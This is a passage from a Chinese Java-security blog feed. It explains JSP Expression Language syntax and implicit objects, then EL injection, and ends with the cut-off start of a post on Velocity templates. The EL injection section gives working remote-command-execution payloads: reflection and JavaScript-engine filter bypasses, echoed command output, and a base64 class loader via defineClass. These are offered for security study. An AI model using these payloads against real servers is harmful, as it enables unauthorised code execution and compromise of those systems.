id="操作符">操作符</h3><p>JSP表达式语言提供以下操作符，其中大部分是Java中常用的操作符：</p><table><thead><tr><th><strong>术语</strong></th><th><strong>定义</strong></th></tr></thead><tbody><tr><td>算术型</td><td>+、-（二元）、*、/、div、%、mod、-（一元）</td></tr><tr><td>逻辑型</td><td>and、&amp;&amp;、or、双管道符、!、not</td></tr><tr><td>关系型</td><td>==、eq、!=、ne、&lt;、lt、&gt;、gt、&lt;=、le、&gt;=、ge。可以与其他值进行比较，或与布尔型、字符串型、整型或浮点型文字进行比较。</td></tr><tr><td>空</td><td>empty 空操作符是前缀操作，可用于确定值是否为空。</td></tr><tr><td>条件型</td><td>A ?B :C。根据 A 赋值的结果来赋值 B 或 C。</td></tr></tbody></table><h3 id="隐式对象">隐式对象</h3><p>JSP表达式语言定义了一组隐式对象，其中许多对象在 JSP scriplet 和表达式中可用：</p><table><thead><tr><th><strong>术语</strong></th><th><strong>定义</strong></th></tr></thead><tbody><tr><td>pageContext</td><td>JSP页的上下文，可以用于访问 JSP 隐式对象，如请求、响应、会话、输出、servletContext 等。例如，${pageContext.response}为页面的响应对象赋值。</td></tr></tbody></table><p>此外，还提供几个隐式对象，允许对以下对象进行简易访问：</p><table><thead><tr><th><strong>术语</strong></th><th><strong>定义</strong></th></tr></thead><tbody><tr><td>param</td><td>将请求参数名称映射到单个字符串参数值（通过调用 ServletRequest.getParameter (String name) 获得）。getParameter (String) 方法返回带有特定名称的参数。表达式${param . name}相当于 request.getParameter (name)。</td></tr><tr><td>paramValues</td><td>将请求参数名称映射到一个数值数组（通过调用 ServletRequest.getParameter (String name) 获得）。它与 param 隐式对象非常类似，但它检索一个字符串数组而不是单个值。表达式 ${paramvalues. name} 相当于 request.getParamterValues(name)。</td></tr><tr><td>header</td><td>将请求头名称映射到单个字符串头值（通过调用 ServletRequest.getHeader(String name) 获得）。表达式 ${header. name} 相当于 request.getHeader(name)。</td></tr><tr><td>headerValues</td><td>将请求头名称映射到一个数值数组（通过调用 ServletRequest.getHeaders(String) 获得）。它与头隐式对象非常类似。表达式${headerValues. name}相当于 request.getHeaderValues(name)。</td></tr><tr><td>cookie</td><td>将 cookie 名称映射到单个 cookie 对象。向服务器发出的客户端请求可以获得一个或多个 cookie。表达式${cookie. name .value}返回带有特定名称的第一个 cookie 值。如果请求包含多个同名的 cookie，则应该使用${headerValues. name}表达式。</td></tr><tr><td>initParam</td><td>将上下文初始化参数名称映射到单个值（通过调用 ServletContext.getInitparameter(String name) 获得）。</td></tr></tbody></table><p>除了上述两种类型的隐式对象之外，还有些对象允许访问多种范围的变量，如 Web 上下文、会话、请求、页面：</p><table><thead><tr><th><strong>术语</strong></th><th><strong>定义</strong></th></tr></thead><tbody><tr><td>pageScope</td><td>将页面范围的变量名称映射到其值。例如，EL 表达式可以使用${pageScope.objectName}访问一个 JSP 中页面范围的对象，还可以使用${pageScope .objectName. attributeName}访问对象的属性。</td></tr><tr><td>requestScope</td><td>将请求范围的变量名称映射到其值。该对象允许访问请求对象的属性。例如，EL 表达式可以使用${requestScope. objectName}访问一个 JSP 请求范围的对象，还可以使用${requestScope. objectName. attributeName}访问对象的属性。</td></tr><tr><td>sessionScope</td><td>将会话范围的变量名称映射到其值。该对象允许访问会话对象的属性。例如：${sessionScope. name}</td></tr><tr><td>applicationScope</td><td>将应用程序范围的变量名称映射到其值。该隐式对象允许访问应用程序范围的对象。</td></tr></tbody></table><h4 id="pageContext对象">pageContext对象</h4><p>pageContext对象是JSP中pageContext对象的引用。通过pageContext对象，您可以访问request对象。比如，访问request对象传入的查询字符串，就像这样：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;pageContext.request.queryString&#125;</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1713153806642-e746ebd6-90db-4829-9222-4c5e652d53fb.png" alt=""></p><h4 id="Scope对象">Scope对象</h4><p>pageScope，requestScope，sessionScope，applicationScope变量用来访问存储在各个作用域层次的变量。</p><p>举例来说，如果您需要显式访问在applicationScope层的box变量，可以这样来访问：applicationScope.box。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;% </span><br><span class="line">pageContext.setAttribute(<span class="string">&quot;name&quot;</span>,<span class="string">&quot;mi1k7ea_page&quot;</span>);  </span><br><span class="line">request.setAttribute(<span class="string">&quot;name&quot;</span>,<span class="string">&quot;mi1k7ea_request&quot;</span>);</span><br><span class="line">session.setAttribute(<span class="string">&quot;user&quot;</span>,<span class="string">&quot;mi1k7ea_session&quot;</span>);</span><br><span class="line">application.setAttribute(<span class="string">&quot;user&quot;</span>,<span class="string">&quot;mi1k7ea_application&quot;</span>);</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">pageScope.name:$&#123;pageScope.name&#125;</span><br><span class="line">                 &lt;/br&gt;</span><br><span class="line">                 requestScope.name : $&#123;requestScope.name&#125;</span><br><span class="line">                                       &lt;/br&gt;</span><br><span class="line">                                       sessionScope.user : $&#123;sessionScope.user&#125;</span><br><span class="line">                                                             &lt;/br&gt;</span><br><span class="line">                                                             applicationScope.user : $&#123;applicationScope.user&#125;</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1713153829067-32ff9b8b-a253-4bd2-ae74-51e2636c231e.png" alt=""></p><h4 id="param和paramValues对象">param和paramValues对象</h4><p>param和paramValues对象用来访问参数值，通过使用request.getParameter方法和request.getParameterValues方法。</p><p>举例来说，访问一个名为order的参数，可以这样使用表达式：${param.order}，或者${param[“order”]}。</p><p>接下来的例子表明了如何访问request中的username参数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.*,java.util.*&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line"><span class="type">String</span> <span class="variable">title</span> <span class="operator">=</span> <span class="string">&quot;Accessing Request Param&quot;</span>;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;&lt;% out.print(title); %&gt;&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;h1&gt;&lt;% out.print(title); %&gt;&lt;/h1&gt;</span><br><span class="line">&lt;/center&gt;</span><br><span class="line">&lt;div align=<span class="string">&quot;center&quot;</span>&gt;</span><br><span class="line">&lt;p&gt;$&#123;param[<span class="string">&quot;username&quot;</span>]&#125;&lt;/p&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>param对象返回单一的字符串，而paramValues对象则返回一个字符串数组。<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1713153867755-8e21a12e-bbe3-4065-bb3e-4e4edefafabf.png" alt=""></p><h4 id="header和headerValues对象">header和headerValues对象</h4><p>header和headerValues对象用来访问信息头，通过使用request.getHeader()方法和request.getHeaders()方法。</p><p>举例来说，要访问一个名为user-agent的信息头，可以这样使用表达式：${header.user-agent}，或者${header[“user-agent”]}。</p><p>接下来的例子表明了如何访问user-agent信息头：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.*,java.util.*&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">String</span> <span class="variable">title</span> <span class="operator">=</span> <span class="string">&quot;User Agent Example&quot;</span>;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;&lt;% out.print(title); %&gt;&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;h1&gt;&lt;% out.print(title); %&gt;&lt;/h1&gt;</span><br><span class="line">&lt;/center&gt;</span><br><span class="line">&lt;div align=<span class="string">&quot;center&quot;</span>&gt;</span><br><span class="line">&lt;p&gt;$&#123;header[<span class="string">&quot;user-agent&quot;</span>]&#125;&lt;/p&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1713153889726-5e07cb9b-c981-4867-97e9-c8c43482d2a2.png" alt="">header对象返回单一值，而headerValues则返回一个字符串数组。</p><h3 id="JSP中启动-禁用EL表达式">JSP中启动/禁用EL表达式</h3><h3 id="全局禁用EL表达式">全局禁用EL表达式</h3><p>web.xml中进入如下配置：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">jsp-config</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">jsp-property-group</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>*.jsp<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">el-ignored</span>&gt;</span>true<span class="tag">&lt;/<span class="name">el-ignored</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">jsp-property-group</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">jsp-config</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="单个文件禁用EL表达式">单个文件禁用EL表达式</h3><p>在JSP文件中可以有如下定义：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page isELIgnored=<span class="string">&quot;true&quot;</span> %&gt;</span><br></pre></td></tr></table></figure><p>该语句表示是否禁用EL表达式，TRUE表示禁止，FALSE表示不禁止。</p><h3 id="EL表达式注入漏洞">EL表达式注入漏洞</h3><p>EL表达式注入漏洞和SpEL、OGNL等表达式注入漏洞是一样的漏洞原理的，即表达式外部可控导致攻击者注入恶意表达式实现任意代码执行。</p><p>一般的，EL表达式注入漏洞的外部可控点入口都是在Java程序代码中，即Java程序中的EL表达式内容全部或部分是从外部获取的。</p><h3 id="通用PoC">通用PoC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//对应于JSP页面中的pageContext对象（注意：取的是pageContext对象）</span></span><br><span class="line">$&#123;pageContext&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取Web路径</span></span><br><span class="line">$&#123;pageContext.getSession().getServletContext().getClassLoader().getResource(<span class="string">&quot;&quot;</span>)&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//文件头参数</span></span><br><span class="line">$&#123;header&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取webRoot</span></span><br><span class="line">$&#123;applicationScope&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//执行命令</span></span><br><span class="line">$&#123;pageContext.request.getSession().setAttribute(<span class="string">&quot;a&quot;</span>,pageContext.request.getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>).invoke(<span class="literal">null</span>,<span class="literal">null</span>).exec(<span class="string">&quot;calc&quot;</span>).getInputStream())&#125;</span><br></pre></td></tr></table></figure><p>比如我们在Java程序中可以控制输入EL表达式如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;pageContext.setAttribute(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;&quot;</span>.getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;&quot;</span>.getClass()).invoke(<span class="string">&quot;&quot;</span>.getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(<span class="literal">null</span>),<span class="string">&quot;calc.exe&quot;</span>))&#125;</span><br></pre></td></tr></table></figure><p>如果该EL表达式直接在JSP页面中执行，则触发任意代码执行漏洞：</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1713154033805-2f6a4a9c-8939-4d54-aab5-58560d228715.png" alt=""></p><p>但是在实际场景中，是几乎没有也无法直接从外部控制JSP页面中的EL表达式的。而目前已知的EL表达式注入漏洞都是框架层面服务端执行的EL表达式外部可控导致的。</p><h3 id="绕过方法">绕过方法</h3><p>这里针对前面在Java代码中注入EL表达式的例子来演示。其实绕过方法和SpEL表达式注入是一样的。</p><h4 id="利用反射机制绕过">利用反射机制绕过</h4><p>即前面Demo的PoC，注意一点的就是这里不支持用字符串拼接的方式绕过关键字过滤。</p><h4 id="利用ScriptEngine调用JS引擎绕过">利用ScriptEngine调用JS引擎绕过</h4><p>同SpEL注入中讲到的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;<span class="string">&#x27;&#x27;</span>.getClass().forName(<span class="string">&quot;javax.script.ScriptEngineManager&quot;</span>).newInstance().getEngineByName(<span class="string">&quot;JavaScript&quot;</span>).eval(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(&#x27;calc&#x27;)&quot;</span>)&#125;</span><br></pre></td></tr></table></figure><h3 id="无回显执行命令">无回显执行命令</h3><p>可能大家最常见到的就是执行命令的payload，由于el表达式不能执行new等操作，所以需要用反射来构造。</p><p>样例如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=$&#123;<span class="string">&quot;&quot;</span>.getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;&quot;</span>.getClass()).invoke(<span class="string">&quot;&quot;</span>.getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(<span class="literal">null</span>),<span class="string">&quot;calc.exe&quot;</span>)&#125;</span><br></pre></td></tr></table></figure><p>或者是借助js引擎</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=$&#123;<span class="string">&quot;&quot;</span>.getClass().forName(<span class="string">&quot;javax.script.ScriptEngineManager&quot;</span>).newInstance().getEngineByName(<span class="string">&quot;js&quot;</span>).eval(<span class="string">&quot;new+java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;cmd&#x27;,&#x27;/c&#x27;,&#x27;calc&#x27;]).start()&quot;</span>)&#125;</span><br></pre></td></tr></table></figure><p>不过两者都是无回显的，不优雅。</p><h3 id="有回显执行命令">有回显执行命令</h3><p>最早看到的有回显相关的研究是在这篇文章：<a href="https://forum.butian.net/share/886%EF%BC%8C%E5%86%99%E7%9A%84%E9%9D%9E%E5%B8%B8%E5%A5%BD%EF%BC%8C%E6%9C%80%E5%90%8E%E7%9A%84payload%E5%A6%82%E4%B8%8B%EF%BC%9A">https://forum.butian.net/share/886，写的非常好，最后的payload如下：</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;pageContext.setAttribute(<span class="string">&quot;inputStream&quot;</span>, Runtime.getRuntime().exec(<span class="string">&quot;cmd /c dir&quot;</span>).getInputStream());Thread.sleep(<span class="number">1000</span>);pageContext.setAttribute(<span class="string">&quot;inputStreamAvailable&quot;</span>, pageContext.getAttribute(<span class="string">&quot;inputStream&quot;</span>).available());pageContext.setAttribute(<span class="string">&quot;byteBufferClass&quot;</span>, Class.forName(<span class="string">&quot;java.nio.ByteBuffer&quot;</span>));pageContext.setAttribute(<span class="string">&quot;allocateMethod&quot;</span>, pageContext.getAttribute(<span class="string">&quot;byteBufferClass&quot;</span>).getMethod(<span class="string">&quot;allocate&quot;</span>, Integer.TYPE));pageContext.setAttribute(<span class="string">&quot;heapByteBuffer&quot;</span>, pageContext.getAttribute(<span class="string">&quot;allocateMethod&quot;</span>).invoke(<span class="literal">null</span>, pageContext.getAttribute(<span class="string">&quot;inputStreamAvailable&quot;</span>)));pageContext.getAttribute(<span class="string">&quot;inputStream&quot;</span>).read(pageContext.getAttribute(<span class="string">&quot;heapByteBuffer&quot;</span>).array(), <span class="number">0</span>, pageContext.getAttribute(<span class="string">&quot;inputStreamAvailable&quot;</span>));pageContext.setAttribute(<span class="string">&quot;byteArrType&quot;</span>, pageContext.getAttribute(<span class="string">&quot;heapByteBuffer&quot;</span>).array().getClass());pageContext.setAttribute(<span class="string">&quot;stringClass&quot;</span>, Class.forName(<span class="string">&quot;java.lang.String&quot;</span>));pageContext.setAttribute(<span class="string">&quot;stringConstructor&quot;</span>, pageContext.getAttribute(<span class="string">&quot;stringClass&quot;</span>).getConstructor(pageContext.getAttribute(<span class="string">&quot;byteArrType&quot;</span>)));pageContext.setAttribute(<span class="string">&quot;stringRes&quot;</span>, pageContext.getAttribute(<span class="string">&quot;stringConstructor&quot;</span>).newInstance(pageContext.getAttribute(<span class="string">&quot;heapByteBuffer&quot;</span>).array()));pageContext.getAttribute(<span class="string">&quot;stringRes&quot;</span>)&#125;</span><br></pre></td></tr></table></figure><p>由于EL表达式不支持直接赋值以及new对象，所以需要用到pageContext.getAttribute跟pageContext.setAttribute来间接实现变量的传递，导致payload写起来非常的麻烦，也非常的臃肿。</p><p>所以我们换一种思路，不再使用EL自身的语法，而是在js引擎中实现我们的逻辑。</p><p>经过简化后，我们的payload如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;<span class="string">&quot;&quot;</span>.getClass().forName(<span class="string">&quot;javax.script.ScriptEngineManager&quot;</span>).newInstance().getEngineByName(<span class="string">&quot;js&quot;</span>).eval(<span class="string">&quot;var s = [3];s[0] = \&quot;cmd\&quot;;s[1] = \&quot;/c\&quot;;s[2] = \&quot;whoami\&quot;;var p = java.lang.Runtime.getRuntime().exec(s);var sc = new java.util.Scanner(p.getInputStream(),\&quot;GBK\&quot;).useDelimiter(\&quot;\\\\A\&quot;);var result = sc.hasNext() ? sc.next() : \&quot;\&quot;;sc.close();result;&quot;</span>)&#125;</span><br></pre></td></tr></table></figure><h3 id="任意代码执行">任意代码执行</h3><p>在这里我们同样可以借助js引擎调用defineClass来实现任意代码执行的操作：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=$&#123;<span class="string">&quot;&quot;</span>.getClass().forName(<span class="string">&quot;javax.script.ScriptEngineManager&quot;</span>).newInstance().getEngineByName(<span class="string">&quot;js&quot;</span>).eval(pageContext.request.getParameter(<span class="string">&quot;ant&quot;</span>))&#125;</span><br></pre></td></tr></table></figure><p>ant参数内容如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    load(<span class="string">&quot;nashorn:mozilla_compat.js&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line">  importPackage(Packages.java.util);</span><br><span class="line">  importPackage(Packages.java.lang);</span><br><span class="line">  importPackage(Packages.java.io);</span><br><span class="line">  function <span class="title function_">Base64DecodeToByte</span><span class="params">(str)</span> &#123;</span><br><span class="line">    importPackage(Packages.sun.misc);</span><br><span class="line">    importPackage(Packages.java.util);</span><br><span class="line">    <span class="keyword">var</span> bt;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      bt = <span class="keyword">new</span> <span class="title class_">BASE64Decoder</span>().decodeBuffer(str);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">      bt = Base64().getDecoder().decode(str);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> bt;</span><br><span class="line">  &#125;</span><br><span class="line">  function <span class="title function_">define</span><span class="params">(Classdata, cmd)</span> &#123;</span><br><span class="line">    <span class="type">var</span> <span class="variable">classBytes</span> <span class="operator">=</span> Base64DecodeToByte(Classdata);</span><br><span class="line">    <span class="type">var</span> <span class="variable">byteArray</span> <span class="operator">=</span> Java.type(<span class="string">&quot;byte[]&quot;</span>);</span><br><span class="line">    <span class="type">var</span> <span class="variable">int</span> <span class="operator">=</span> Java.type(<span class="string">&quot;int&quot;</span>);</span><br><span class="line">    <span class="type">var</span> <span class="variable">defineClassMethod</span> <span class="operator">=</span> java.lang.ClassLoader.class.getDeclaredMethod(</span><br><span class="line">      <span class="string">&quot;defineClass&quot;</span>,</span><br><span class="line">      byteArray.class,</span><br><span class="line">      <span class="type">int</span>.class,</span><br><span class="line">      <span class="type">int</span>.class</span><br><span class="line">    );</span><br><span class="line">    defineClassMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">var</span> <span class="variable">cc</span> <span class="operator">=</span> defineClassMethod.invoke(</span><br><span class="line">      Thread.currentThread().getContextClassLoader(),</span><br><span class="line">      classBytes,</span><br><span class="line">      <span class="number">0</span>,</span><br><span class="line">      classBytes.length</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">return</span> cc.getConstructor(java.lang.String.class).newInstance(cmd);</span><br><span class="line">  &#125;  </span><br><span class="line">  define(</span><br><span class="line">    <span class="string">&quot;yv66vgAAADQAKQoABwAZCgAaABsKABoAHAcAHQoABAAeBwAfBwAgAQAGPGluaXQ+AQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAAR0aGlzAQAGTGNhbGM7AQADY21kAQASTGphdmEvbGFuZy9TdHJpbmc7AQANU3RhY2tNYXBUYWJsZQcAHwcAIQcAHQEAClNvdXJjZUZpbGUBAAljYWxjLmphdmEMAAgAIgcAIwwAJAAlDAAmACcBABNqYXZhL2lvL0lPRXhjZXB0aW9uDAAoACIBAARjYWxjAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TdHJpbmcBAAMoKVYBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAPcHJpbnRTdGFja1RyYWNlACEABgAHAAAAAAABAAEACAAJAAEACgAAAIgAAgADAAAAFSq3AAG4AAIrtgADV6cACE0stgAFsQABAAQADAAPAAQAAwALAAAAGgAGAAAABAAEAAYADAAJAA8ABwAQAAgAFAAKAAwAAAAgAAMAEAAEAA0ADgACAAAAFQAPABAAAAAAABUAEQASAAEAEwAAABMAAv8ADwACBwAUBwAVAAEHABYEAAEAFwAAAAIAGA==&quot;</span>,</span><br><span class="line">      <span class="string">&quot;calc&quot;</span></span><br><span class="line">    );</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;spel基础参考：&lt;a href=&quot;https://www.mi1k7ea.com/2020/01/10/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%9</summary>
      
    
    
    
    <category term="Java安全" scheme="https://oceanzbz.github.io/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="注入" scheme="https://oceanzbz.github.io/tags/%E6%B3%A8%E5%85%A5/"/>
    
    <category term="Java表达式" scheme="https://oceanzbz.github.io/tags/Java%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    
  </entry>
  
  <entry>
    <title>Java模版注入</title>
    <link href="https://oceanzbz.github.io/post/5fe9ba9f.html"/>
    <id>https://oceanzbz.github.io/post/5fe9ba9f.html</id>
    <published>2024-12-30T05:44:38.000Z</published>
    <updated>2025-03-05T07:24:36.793Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Velocity的简介">Velocity的简介</h2><p>Velocity模板引擎, 作为一款成熟的基于java的模板引擎，能够帮我们实现页面静态化，同时它将Java代码与网页分开，将模板和填入数据整合,生成我们需要的页面.</p><h3 id="1-基本语法">1 基本语法</h3><h4 id="1-关键字">1 关键字</h4><p>Velocity模板中的关键字, 都是以#开头表示的</p><ul><li>#set 设置一个变量</li><li>#if 条件分支判断</li><li>#else 另一个条件分支</li><li>#end 语句结束</li><li>#foreach 循环语句</li></ul><h4 id="2-变量">2 变量</h4><p>Velocity模板中的变量, 都是以$开头表示的</p><p>如: $user用户 $password 用户密码</p><p><strong>{}变量</strong></p><p>对于明确的Velocity变量, 可以使用{}包括起来, 可以在页面上展示如下效果:</p><p>${user}Name, 此时页面上可以表示为$someoneName的效果.</p><p><strong>!变量</strong></p><p>如上述内容,Velocity模板中如果变量不存在, 在页面会显示$user, 这种形式影响展示的效果. 可以使用$!user表示.</p><p>$!user表示, 存在则展示,不存在则为空白</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">vm</span><br><span class="line">复制代码## 定义一个user变量为李白, password变量为<span class="number">123456</span> </span><br><span class="line">#set&#123;$user = <span class="string">&quot;李白&quot;</span>&#125;</span><br><span class="line">#set&#123;$password = <span class="string">&quot;123456&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">## 变量引用</span><br><span class="line">#set&#123;$student.name = <span class="string">&quot;李白&quot;</span>&#125;</span><br><span class="line">## 数字</span><br><span class="line">#set&#123;$student.age = <span class="number">22</span>&#125;</span><br><span class="line">## 字符串</span><br><span class="line">#set&#123;$student.class = <span class="string">&quot;大班&quot;</span>&#125;</span><br><span class="line">## 属性引用  </span><br><span class="line">#set($student.address = $address.info)</span><br></pre></td></tr></table></figure><h4 id="3-转义字符和逻辑操作符">3 转义字符和逻辑操作符</h4><p>Velocity模板中转义字符是 \</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">vm</span><br><span class="line">复制代码#set&#123;$user = <span class="string">&quot;李白&quot;</span>&#125;</span><br><span class="line">## 输入结果</span><br><span class="line">$user 李白</span><br><span class="line">\$user $user</span><br><span class="line">\\$user \李白</span><br><span class="line">\\\$user \$user</span><br></pre></td></tr></table></figure><p>&amp;&amp; 且</p><p>|| 或</p><p>! 取反</p><h4 id="4-循环">4 